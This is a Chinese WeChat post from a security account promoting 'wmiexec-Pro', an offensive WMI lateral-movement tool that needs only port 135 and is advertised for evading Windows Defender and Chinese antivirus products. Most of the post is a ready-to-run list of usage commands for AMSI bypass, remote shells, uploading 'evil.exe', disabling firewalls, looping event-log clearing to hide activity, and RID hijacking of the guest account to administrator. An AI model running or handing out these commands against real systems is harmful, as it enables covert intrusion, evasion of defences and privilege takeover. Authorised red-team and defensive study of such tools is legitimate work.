#  新一代免杀版wmiexec.py

[ 夜组安全 ](javascript:void\(0\);)

**夜组安全** ![]()

微信号 NightCrawler_Team

功能介绍 "恐惧就是貌似真实的伪证" NightCrawler Team(简称:夜组)主攻WEB安全 | 内网渗透 | 红蓝对抗 | 代码审计 |
APT攻击，致力于将每一位藏在暗处的白帽子聚集在一起，在夜空中划出一道绚丽的光线！

____

___发表于_

收录于合集 #安全工具 65个

免责声明

由于传播、利用本公众号夜组安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号夜组安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把 **夜组安全** “ **设为星标** ”，否则可能就看不到了啦！

![]()![]()

 **安全工具**

![]()![]()

 **01**

 **Tra工具介绍**

新一代 wmiexec.py，更多新功能，整体操作仅与端口135（不需要SMB连接）进行横向移动中的AV规避（Windows
Defender，火绒，360）。

 **02**

 **工具功能**

  * 主要功能：AV规避

  * 主要特点：无需`win32_process`

  * 主要功能：只需要端口135。

  * 新模块：AMSI 旁路

  * 新模块：文件传输

  * 新模块：通过 wmi 类方法远程启用 RDP

  * 新模块：Windows防火墙滥用

  * 新模块：事件日志循环清理

  * 新模块：无需接触 CMD 即可远程启用 WinRM

  * 新模块：服务管理器

  * 新模块：RID-劫持

  * 增强：以新方式获取命令执行输出

  * 增强功能：执行 vbs 文件

 **03**

 **工具安装**

 **安装**

  *   *   * 

    
    
     git clone https://github.com/fortra/impacketcd imapcket && sudo pip3 install .git clone https://github.com/XiaoliChan/wmiexec-Pro

 **使用**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     python3 wmiexec-pro.py [[domain/]username[:password]@]<targetName or address> module -h  
    Basic enumeration:   python3 wmiexec-pro.py administrator:password@192.168.1.1 enum -run  
    Enable/disable amsi bypass:   python3 wmiexec-pro.py administrator:password@192.168.1.1 amsi -enable   python3 wmiexec-pro.py administrator:password@192.168.1.1 amsi -disable  
    Execute command:   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -shell (Launch a semi-interactive shell)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" (Default is with output mode)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -silent (Silent mode)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -silent -old (Slient mode in old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -old (With output in old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -save (With output and save output to file)   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -old -save   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -clear (Remove temporary class for command result storage)   Filetransfer:   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -upload -src-file "./evil.exe" -dest-file "C:\windows\temp\evil.exe" (Upload file over 512KB)   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -download -src-file "C:\windows\temp\evil.exe" -dest-file "/tmp/evil.exe" (Download file over 512KB)   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -clear (Remove temporary class for file transfer)   RDP:   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable (Auto configure firewall)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable -old (For old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable-ram (Enable Restricted Admin Mode for PTH, not support old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable -old (For old version OS, such as server 2003, not support old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable-ram (Disable Restricted Admin Mode)  
    WinRM (Only support win7+):   python3 wmiexec-pro.py administrator:password@192.168.1.1 winrm -enable   python3 wmiexec-pro.py administrator:password@192.168.1.1 winrm -disable  
    Firewall (Only support win8+):   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -search-port 445   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -dump (Dump all firewall rules)   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -rule-id (ID from search port) -action [enable/disable/remove] (enable, disable, remove specify rule)   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -firewall-profile enable (Enable all firewall profiles)   python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -firewall-profile disable (Disable all firewall profiles)   Services:   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action create -service-name "test" -display-name "For test" -bin-path 'C:\windows\system32\calc.exe'   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action create -service-name "test" -display-name "For test" -bin-path 'C:\windows\system32\calc.exe' -class "Win32_TerminalService" (Create service via alternative class)   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action start -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action stop -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action disable -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action auto-start -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action manual-start -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action getinfo -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -action delete -service-name "test"   python3 wmiexec-pro.py administrator:password@192.168.1.1 service -dump all-services.json  
    Eventlog:   python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -risk-i-know (Looping cleaning eventlog)   python3 wmiexec-pro.py administrator:password@192.168.1.1 eventlog -retrive object-ID (Stop looping cleaning eventlog)  
    RID Hijack:   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action grant (Grant access permissions for SAM/SAM subkey in registry)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action grant-old (For old version OS, such as server 2003)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action activate (Activate user)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action deactivate (Deactivate user)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 501 -action hijack -user 501 -hijack-rid 500 (Hijack guest user rid 501 to administrator rid 500)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login enable (Enable blank password login)   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -blank-pass-login disable   python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 500 -action backup (This will save user profile data as json file)   python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -user 500 -remove (Use guest user remove administrator user profile after rid hijacked)   python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -restore "backup.json" (Restore user profile for target user)   

**帮助**  

![]()

  
 **执行命令**

![]()

  
 **文件传输**  
  
上传文件  

![]()

下载文件

![]()

  

 **04**

 **工具下载**

 **点击关注下方名片** **进入公众号**

 **回复关键字【 230803** **】获取** **下载链接**

  

 **05**

 **往期精彩**

[ ![]()

HW一手情报获取

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487455&idx=1&sn=63aa23889c7a9c5fc2ce2af366ddb7e6&chksm=c3684b27f41fc231c7c8b70fab70bea1398b8997fc9b653c4ba9929d31b99cb926a9d2eed4a9&scene=21#wechat_redirect)

  

[ ![]()

解密DBeaver数据库软件保存的密码

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487547&idx=1&sn=99d11fc16cb7fa04cb190a5b4a3008b9&chksm=c36854c3f41fddd528c1eedae90fe7e9837559c4c14aef08e1a27e6d5e25d163d6b9fc4c5256&scene=21#wechat_redirect)

  

[ ![]()

burp插件支持fastjson扫描,权限绕过,未授权检测,sql注入检测,工具调用

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487536&idx=1&sn=8dbd66e90009f259d645814709f7e96d&chksm=c36854c8f41fdddea6c7a91f5800a25170c6ec85d0fc4e08716fcec88f4759c5f9cd066fb59f&scene=21#wechat_redirect)

![]()  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

